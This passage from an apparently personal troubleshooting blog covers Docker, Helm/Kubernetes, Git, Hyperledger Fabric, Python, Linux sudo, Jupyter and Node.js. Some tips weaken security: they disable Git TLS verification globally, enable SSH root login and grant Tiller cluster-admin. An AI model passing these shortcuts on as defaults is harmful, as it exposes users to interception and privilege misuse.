looks good to me.\n</code></pre><ol start=\"4\">\n<li><p>If you choose <code>hostpath</code> as your presistentVolume, you can only use <code>ReadWriteOnce</code> for single node, since you developments environment is single node.</p>\n</li>\n<li><p>And if you create a service without defining a selector as in a yaml file, like most people do in case to select the pods, endpoints will not be create. But, fortunatly, kubernetes offers a alternative way to make sure you container, which deployed in some specific pods, to communicate with other exogenous container. </p>\n<ul>\n<li>declaring another kind as endpoints, as you can noticed when you use <code>kubectl get endpoints</code>, which endpoints defined as a permanent word in kubetctl, to create a type of component, with setting some propetries.</li>\n<li>when it comes to the imperative complexity, multiple ports is be requisted in many services deployment. As defined in whether kubernetes or any network policy, exposing more than one port is necessary. Kubernetes supports multiple port definitions on a Service object. Resulting from that predefined statements, when using multiple ports you must give all of your ports names, so that endpoints can be disambiguated.  </li>\n<li>Endpoint will not be alloted unless the pods be created.</li>\n</ul>\n</li>\n<li><p>helm init failure becuase of the image pulling crash. So I need to setting a docker-proxy and daemon-reload/restart docker to pull the images again.</p>\n</li>\n<li><p>Though helm init successfully when image has been pulled, helm still cannot connect to the kubernetes api server. It shows:</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Get http://localhost:8080/api/v1/namespaces/kube-system/configmaps?labelSelector=OWNER%!D(MISSING)TILLER: dial tcp [::1]:8080: connect: connection refused</span><br></pre></td></tr></table></figure>\n<ul>\n<li>It seems that the tiller pod in kubernetes cannot connect to the api servier cause lack of HOST or DNS. </li>\n<li>Using <code>docker exec -it container_ip env</code> to get the environment variable to check whether the KUBERNETES_SERVICE_HOST exists. Then I got the 10.254.0.1, it looks like the default kuberentes service IP</li>\n</ul>\n</li>\n<li><p>In the Great China, most of the Internet stuff about the goolge cannot be accessible. But some tech company are willing to help other programmer to get access google cloud, npm and any repo which is blocked in the outside of the GWF. It is the same as the helm. The final solution for me is installing an aliyun version of helm to get to start the tiller. Also, don’t forget to get the right version matching between client and server.</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts</span><br><span class=\"line\">kubectl create serviceaccount --namespace kube-system tiller</span><br><span class=\"line\">kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller</span><br><span class=\"line\">kubectl patch deploy --namespace kube-system tiller-deploy -p &apos;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&apos;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Noticed that when I using 2.10 version of helm, there is an gorouting error happend by typing <code>helm ls</code></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x1276506] tiller</span><br></pre></td></tr></table></figure>\n<ul>\n<li>That is a dev bug undering the development of the helm.</li>\n<li>downupgrde you helm to 2.9.1 will be fine.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h1><ol>\n<li><code>Encountered end of file</code><ul>\n<li>Add $GIT_CURL_VERBOSE=1 can solved that problem </li>\n</ul>\n</li>\n<li>Still be annoied by the useless private gitlab server, problem comes one by one without any obviating indication. <ul>\n<li><code>Peer&#39;s Certificate issuer is not recognized.</code></li>\n<li>two solutions, the first one is setting GIS_SSL_NO_VERIFY environment parametes to true</li>\n<li>the another one is using <code>git config --global http.sslVerify false</code> to solving the config missing</li>\n</ul>\n</li>\n<li><p>git can not clone a repo from a unsafe link </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fatal: unable to access &apos;https://***.git/&apos;: SSL certificate problem: self signed certificate</span><br></pre></td></tr></table></figure>\n<ul>\n<li>solution: add a environment in the front of you command:</li>\n<li>GIT_SSL_NO_VERIFY=true git clone <em>**</em></li>\n</ul>\n</li>\n<li>what if you used a Github account on your mac before but now your changed your account?</li>\n</ol>\n<p>Try remove your account:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git credential-osxkeychain erase</span><br><span class=\"line\">host=github.com</span><br><span class=\"line\">protocol=https</span><br><span class=\"line\">[Press Return]</span><br></pre></td></tr></table></figure>\n<p>and using <code>git push</code>  or whatever the command to handle git and login your git account again.</p>\n<h1 id=\"Hyperledger-Fabric\"><a href=\"#Hyperledger-Fabric\" class=\"headerlink\" title=\"Hyperledger Fabric\"></a>Hyperledger Fabric</h1><ol>\n<li><p><code>Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host</code></p>\n<ul>\n<li>Small fix difícil de conseguir para Hyperledger Fabric 1.1.0 corriendo en Docker Swarm. Multiples organizations corriendo en un mismo host:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">createChaincodeServer -&gt; ERRO 02a Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host</span><br><span class=\"line\"></span><br><span class=\"line\">Resulta que para la versión 1.1.0 de HLF se requiere incluir esta propiedad en el environment section del docker-compose.yaml de los peers:</span><br><span class=\"line\"></span><br><span class=\"line\">CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>Error: Error: Calling enrollment endpoint failed with error [Error: read ECONNRESET]</code></p>\n<ul>\n<li>When I try to monitor a event hub for chaincode calling in node SDK, some error throw up after I use my own script to create channel, join, and other stuff. </li>\n<li>The weird things is that, checking the ca container looks good to me. Then I recalled that if it is my fault that not to add remove temp file cache in scripts. So I rechecked it again, however, I cleared the cache. </li>\n<li>How can this happend without any change I did to the server. So I debug my script by line: after I started up the network, I did other channel stuff in few seconds. It surprised me that the log did not throw the error mentioned above. </li>\n<li>It turns out that I can create the channel immediately when I started up the docker-compose.</li>\n<li>Add sleep 5 to the scripts will be fine.</li>\n</ul>\n</li>\n<li><p><code>Promise is rejected: Error: 2 UNKNOWN: access denied: channel [mychannel] creator org [Org1MSP]</code></p>\n<ul>\n<li>orgpeercan not be found in channel</li>\n</ul>\n</li>\n<li><code>error executing chaincode: failed to execute transaction: timeout expired while executing transaction</code><br>Probably because of the chaincode is not installed perfectly</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>Recording some troubleshooting</p>\n<h1 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h1><p>Some tips or little usage of docker </p>\n<ol>\n<li><p>how to shrink the docker logs</p>\n<ul>\n<li><code>truncate -s 0 /var/lib/docker/containers/*/*-json.log</code> </li>\n<li>Though it works, but it still looks so terrible when your produced too many</li>\n</ul>\n</li>\n<li><p>shadowsocks docker-compose:</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">version: &quot;3&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\"></span><br><span class=\"line\">  aes-256-cfb_ss:</span><br><span class=\"line\">    image: mritd/shadowsocks</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 2333:8989</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    command: -m &quot;ss-server&quot; -s &quot;-s 0.0.0.0 -p 8989 -m aes-256-cfb -k mypassword--fast-open&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"netdata\"><a href=\"#netdata\" class=\"headerlink\" title=\"netdata\"></a>netdata</h1><p>Here is the docker-compose file:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  netdata:</span><br><span class=\"line\">    image: netdata/netdata</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /proc:/host/proc:ro</span><br><span class=\"line\">      - /sys:/host/sys:ro</span><br><span class=\"line\">      - /var/run/docker.sock:/var/run/docker.sock:ro</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    cap_add:</span><br><span class=\"line\">      - SYS_PTRACE</span><br><span class=\"line\">    security_opt:</span><br><span class=\"line\">      - apparmor=unconfined</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 19999:19999</span><br></pre></td></tr></table></figure>\n<h1 id=\"Python-snippets\"><a href=\"#Python-snippets\" class=\"headerlink\" title=\"Python snippets\"></a>Python snippets</h1><p>反转字符串：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main(word):</span><br><span class=\"line\">    return &apos; &apos;.join(word.split()[::-1])</span><br><span class=\"line\">word = &apos;the sky is blue&apos;</span><br><span class=\"line\">inverse = main(word)</span><br><span class=\"line\">print(word)</span><br><span class=\"line\">print(inverse)</span><br></pre></td></tr></table></figure></p>\n<p>编辑距离<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from collections import Counter</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(r&apos;word_freq.txt&apos;, encoding=&apos;utf8&apos;)</span><br><span class=\"line\">WORDS = &#123;&#125;</span><br><span class=\"line\">id = 0</span><br><span class=\"line\">for line in f.readlines():</span><br><span class=\"line\">    if id % 2 == 0:</span><br><span class=\"line\">        word_freq = line.split(&apos;\\t&apos;)</span><br><span class=\"line\">        WORDS[word_freq[0]] = int(word_freq[1])</span><br><span class=\"line\">    id = id + 1</span><br><span class=\"line\">letters = open(r&apos;word.txt&apos;, encoding=&apos;utf8&apos;).read()</span><br><span class=\"line\"></span><br><span class=\"line\">N = sum(WORDS.values())</span><br><span class=\"line\"></span><br><span class=\"line\">def P(word):</span><br><span class=\"line\">    return WORDS[word] / N</span><br><span class=\"line\"></span><br><span class=\"line\">def know(words):</span><br><span class=\"line\">    return set(w for w in words if w in WORDS)</span><br><span class=\"line\"></span><br><span class=\"line\">def edits1(word):</span><br><span class=\"line\">    #letters = &apos;abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class=\"line\">    splits = [(word[:i], word[i:]) for i in range(len(word) + 1)] #切分</span><br><span class=\"line\">    deletes = [L + R[1:] for L, R in splits if R] #删除</span><br><span class=\"line\">    transposes = [L + R[1] + R[0] + R[2:] for L, R in splits if len(R) &gt; 1] #移位</span><br><span class=\"line\">    replaces = [L + c + R[1:] for L, R in splits for c in letters] #代替</span><br><span class=\"line\">    inserts = [L + c + R for L, R in splits for c in letters] #插入</span><br><span class=\"line\">    return set(deletes + transposes + replaces + inserts)</span><br><span class=\"line\"></span><br><span class=\"line\">def edits2(word):</span><br><span class=\"line\">    return (e2 for e1 in edits1(word) for e2 in edits1(e1))</span><br><span class=\"line\"></span><br><span class=\"line\">def candidates(word):</span><br><span class=\"line\">    return (know([word]) or know(edits1(word)) or know(edits2(word)) or [word])</span><br><span class=\"line\"></span><br><span class=\"line\">def correction(word):</span><br><span class=\"line\">    return max(candidates(word), key=P)</span><br><span class=\"line\"></span><br><span class=\"line\">print(correction(&apos;正分夺秒&apos;))</span><br></pre></td></tr></table></figure></p>\n<p>Load json file and write it for utf-8 format:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import json</span><br><span class=\"line\">import codecs</span><br><span class=\"line\"></span><br><span class=\"line\">def write_json(output):</span><br><span class=\"line\">    with codecs.open(&quot;config.json&quot;, &quot;w&quot;, &apos;utf-8&apos;) as file:</span><br><span class=\"line\">        # using utf-8 and ensure_ascii for keep the formatting correct</span><br><span class=\"line\">        file.write(json.dumps(output, ensure_ascii=False))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def load_json():</span><br><span class=\"line\">    with open(&quot;template.json&quot;) as file:</span><br><span class=\"line\">        template = json.load(file)</span><br><span class=\"line\">        output = template</span><br><span class=\"line\">        write_json(output)</span><br></pre></td></tr></table></figure>\n<p>Merge dictionary:</p>\n<ol>\n<li>Using the method update()<br>By using the method update() in Python, one list can be merged into another. But in this, the second list is merged into the first list and no new list is created. It returns None.<br>Example:<br>Python code to merge dict using update() method</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Merge(dict1, dict2):</span><br><span class=\"line\">    return(dict2.update(dict1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Driver code</span><br><span class=\"line\">dict1 = &#123;&apos;a&apos;: 10, &apos;b&apos;: 8&#125;</span><br><span class=\"line\">dict2 = &#123;&apos;d&apos;: 6, &apos;c&apos;: 4&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># This return None</span><br><span class=\"line\">print(Merge(dict1, dict2))</span><br><span class=\"line\"></span><br><span class=\"line\"># changes made in dict2</span><br><span class=\"line\">print(dict2)</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>Using ** in Python</li>\n</ol>\n<p>This is generally considered a trick in Python where a single expression is used to merge two dictionaries and stored in a third dictionary. The single expression is <strong>. This does not affect the other two dictionaries. </strong> implies that the argument is a dictionary. Using <strong> [double star] is a shortcut that allows you to pass multiple arguments to a function directly using a dictionary. For more information refer </strong> kwargs in Python. Using this we first pass all the elements of the first dictionary into the third one and then pass the second dictionary into the third. This will replace the duplicate keys of the first dictionary.<br>Example:<br>Python code to merge dict using a single</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Merge(dict1, dict2):</span><br><span class=\"line\">    res = &#123;**dict1, **dict2&#125;</span><br><span class=\"line\">    return res</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Driver code</span><br><span class=\"line\">dict1 = &#123;&apos;a&apos;: 10, &apos;b&apos;: 8&#125;</span><br><span class=\"line\">dict2 = &#123;&apos;d&apos;: 6, &apos;c&apos;: 4&#125;</span><br><span class=\"line\">dict3 = Merge(dict1, dict2)</span><br><span class=\"line\">print(dict3)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Use-argparse\"><a href=\"#Use-argparse\" class=\"headerlink\" title=\"Use argparse.\"></a>Use argparse.</h3><p>For example, with test.py:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import argparse</span><br><span class=\"line\"></span><br><span class=\"line\">parser=argparse.ArgumentParser(</span><br><span class=\"line\">    description=&apos;&apos;&apos;My Description. And what a lovely description it is. &apos;&apos;&apos;,</span><br><span class=\"line\">    epilog=&quot;&quot;&quot;All&apos;s well that ends well.&quot;&quot;&quot;)</span><br><span class=\"line\">parser.add_argument(&apos;--foo&apos;, type=int, default=42, help=&apos;FOO!&apos;)</span><br><span class=\"line\">parser.add_argument(&apos;bar&apos;, nargs=&apos;*&apos;, default=[1, 2, 3], help=&apos;BAR!&apos;)</span><br><span class=\"line\">args=parser.parse_args()</span><br></pre></td></tr></table></figure></p>\n<p>Running</p>\n<p><code>% test.py -h</code><br>yields<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usage: test.py [-h] [--foo FOO] [bar [bar ...]]</span><br><span class=\"line\"></span><br><span class=\"line\">My Description. And what a lovely description it is.</span><br><span class=\"line\"></span><br><span class=\"line\">positional arguments:</span><br><span class=\"line\">  bar         BAR!</span><br><span class=\"line\"></span><br><span class=\"line\">optional arguments:</span><br><span class=\"line\">  -h, --help  show this help message and exit</span><br><span class=\"line\">  --foo FOO   FOO!</span><br><span class=\"line\"></span><br><span class=\"line\">All&apos;s well that ends well.</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h1><h2 id=\"What-is-sudo\"><a href=\"#What-is-sudo\" class=\"headerlink\" title=\"What is sudo\"></a>What is sudo</h2><p>To explain this you need to know what the programs do:</p>\n<p><code>su</code> - The command <code>su</code> is used to switch to another user (<strong>s</strong> witch <strong>u</strong> ser), but you can also switch to the root user by invoking the command with no parameter. <code>su</code> asks you for the password of the user to switch, after typing the password you switched to the user’s environment.     </p>\n<p><code>sudo</code> - <code>sudo</code> is meant to run a single command with root privileges. But unlike <code>su</code> it prompts you for the password of the current user. This user must be in the sudoers file (or a group that is in the sudoers file). By default, Ubuntu “remembers” your password for 15 minutes, so that you don’t have to type your password every time.</p>\n<p><code>bash</code> - A text-interface to interact with the computer. It’s important to understand the difference between login, non-login, interactive and non-interactive shells:</p>\n<ul>\n<li>login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>F1</kbd> to login into a virtual terminal you get after successful login a login shell.</li>\n<li>non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.</li>\n<li>interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.</li>\n<li>non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output.</li>\n</ul>\n<p><strong><code>sudo su</code></strong> Calls <code>sudo</code> with the command <code>su</code>. Bash is called as interactive non-login shell. So bash only executes <code>.bashrc</code>. You can see that after switching to root you are still in the same directory:</p>\n<pre><code>user@host:~$ sudo su\nroot@host:/home/user#\n</code></pre><p><strong><code>sudo su -</code></strong> This time it is a login shell, so <code>/etc/profile</code>, <code>.profile</code> and <code>.bashrc</code> are executed and you will find yourself in root’s home directory with root’s environment.</p>\n<p><strong><code>sudo -i</code></strong> It is nearly the same as <code>sudo su -</code> The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that login-specific resource files such as <code>.profile</code>, <code>.bashrc</code> or <code>.login</code> will be read and executed by the shell.</p>\n<p><strong><code>sudo /bin/bash</code></strong> This means that you call <code>sudo</code> with the command <code>/bin/bash</code>. <code>/bin/bash</code> is started as non-login shell so all the dot-files are not executed, but bash itself reads <code>.bashrc</code> of the calling user. Your environment stays the same. Your home will not be root’s home. So you are root, but in the environment of the calling user.</p>\n<p><strong><code>sudo -s</code></strong> reads the <code>$SHELL</code> variable and executes the content. If <code>$SHELL</code> contains <code>/bin/bash</code> it invokes <code>sudo /bin/bash</code> (see above).</p>\n<p><strong>Check:</strong><br>To check if you are in a login shell or not (works only in bash because <code>shopt</code> is a builtin command):</p>\n<pre><code>shopt -q login_shell &amp;&amp; echo &apos;Login shell&apos; || echo &apos;No login shell&apos;\n</code></pre><h3 id=\"Referencing\"><a href=\"#Referencing\" class=\"headerlink\" title=\"Referencing\"></a>Referencing</h3><ul>\n<li><a href=\"https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used\">https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used</a></li>\n</ul>\n<h3 id=\"To-enable-root-login-in-ubuntu\"><a href=\"#To-enable-root-login-in-ubuntu\" class=\"headerlink\" title=\"To enable root login in ubuntu:\"></a>To enable root login in ubuntu:</h3><p>set <code>/etc/ssh/sshd_config</code>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PermitRootLogin yes</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Jupyter-notebook\"><a href=\"#Jupyter-notebook\" class=\"headerlink\" title=\"Jupyter notebook\"></a>Jupyter notebook</h1><p><a href=\"https://jupyter-notebook.readthedocs.io/en/stable/public_server.html\">Official Guild</a></p>\n<p><a href=\"https://stackoverflow.com/questions/14297741/how-to-start-ipython-notebook-server-at-boot-as-daemon\">Running as a daemon</a></p>\n<p>If you are using Anaconda integrated jupyter-notebook, using <code>which jupyter-notebook</code> to find the place that jupyter located.</p>\n<p>Then add this to <code>/usr/lib/systemd/system/jupyter.service</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Jupyter Notebook</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">PIDFile=/run/jupyter.pid</span><br><span class=\"line\">ExecStart=/root/anaconda3/bin/jupyter-notebook --config=/root/.jupyter/jupyter_notebook_config.py --allow-root</span><br><span class=\"line\">User=jupyter</span><br><span class=\"line\">Group=jupyter</span><br><span class=\"line\">WorkingDirectory=/root</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=10</span><br><span class=\"line\">#KillMode=mixed</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n<p>Sometimes it will faild by the Permission or config issues, using the following method to solve it.</p>\n<ul>\n<li>add <code>--allow-root</code> in the end of the ExecStart command</li>\n<li>remove <code>User</code> or <code>Group</code> on <code>[Service]</code> Option</li>\n<li>add <code>/bin/bash -c</code> in the head of the ExecStart</li>\n</ul>\n<h1 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h1><p>When I transfer my development environment from OSX to Windows, due to the stipulation, I stuffered a lot because of the notorious unfriendly dev-env of windows.</p>\n<ol>\n<li>Unable to create any file or folder. Even though I reset the Security on the Properties on the Disk to full control. <ul>\n<li>Finally I figured out some sorfware or my slip to create redgit lose. </li>\n<li>use win + R to open regdit</li>\n<li>Go into <code>HKEY_CLASSES_ROOT\\Directory\\Background\\shellex\\ContextMenuHandlers\\</code></li>\n<li>Later I will find there only two option in the Context Menu Handlers. That’s werid.</li>\n<li>If New folder exists, edits the New option and modify the Value to <code>{D969A300-E7FF-11d0-A93B-00A0C90F2719}</code></li>\n<li>If it not exists, create one and fill the Value as I mentioned above.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h1><ol>\n<li>Though there are planty of method to deal with the callback machinism, still too many people, especially who have been learning static type language with no rudimentary of asynchronous programming experience, cannot be capable of adapting subversion coding style.</li>\n<li>So I am about to record some trouble when I learning node.js or typescripts or other javascripts-like stuff as a <code>story</code>.</li>\n<li>When I use vscode to write node.js, more specifically, to write javascript style language, like typescript.<ul>\n<li>but when I use <code>buffer</code> type on typescript, there are always pop up a red dot which notice me <code>[ts] cannot find name &#39;buffer&#39;</code>. That’s weird since buffer is a normal variable type in the most programming language, so is it in typescript. However, it still annoying me. </li>\n<li>Here is the conclusion: some node environmnet types are needed when use typescript, for some types are not embeded in typescript. For this limitation, we might be able to get around by stubbing those interfaces in the future. </li>\n<li>I admit it’s odd to have to include node typing for a fornt-end project, but when I try install the envrionmetn typeings to see if it gets around on my issues. It workd for now. </li>\n<li><code>npm install --save-deve @types/node</code></li>\n</ul>\n</li>\n<li>This day, I try to use RocketMQ to build a connection between nodejs and Java, nothing happends… </li>\n<li>When I using npm install to install grpc, processes stucked in <code>node-pre-gyp install --fallback-to-build --library=static_library</code>. Waiting over than 1 hours or more still cannot finished that course. Besides, when I checked the cpu usage of the machine, it seems that all the processers are running in low load, which means that the machine works fine. Now that the trouble must caused by the npm. It looks like shortage of some optional package which makes the process stagged. <ul>\n<li>using <code>yum install -y node-gyp</code> to install the node-pre-gyp or somethings else(I am not sure what it is. But when all installation stuff done, then the npm install going smoothly without any hitch). It is normal when the npm install slow down or even unresponsive when <code>node-pre-grp install</code>, after all the build progress consume some system resources.</li>\n</ul>\n</li>\n<li>running command with nodejs: <a href=\"https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top\">https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top</a></li>\n</ol>\n<h1 id=\"Kubernetes\"><a href=\"#Kubernetes\" class=\"headerlink\" title=\"Kubernetes\"></a>Kubernetes</h1><ol>\n<li>when you have already installed docker-ce or other docker toolkit, you may come into installation conflict unless you choose other installation method instead of using package management tool like <code>yum/apt/...</code>. <ul>\n<li>otherwise, you should uninstall the old version of docker, then run <code>yum install -y etcd kubernetes</code></li>\n</ul>\n</li>\n<li><p>when I using pod deployment to run a hello-world cluster, I found that k8s can not let the container running and unable to create replication. </p>\n<ul>\n<li><p>Use <code>kubectl describe pods</code> to get more information. Scrolling down to the last line, I saw that it’s going to readhat.com and failing. Why it’s using RedHat repo？ Did it should pull from the docker 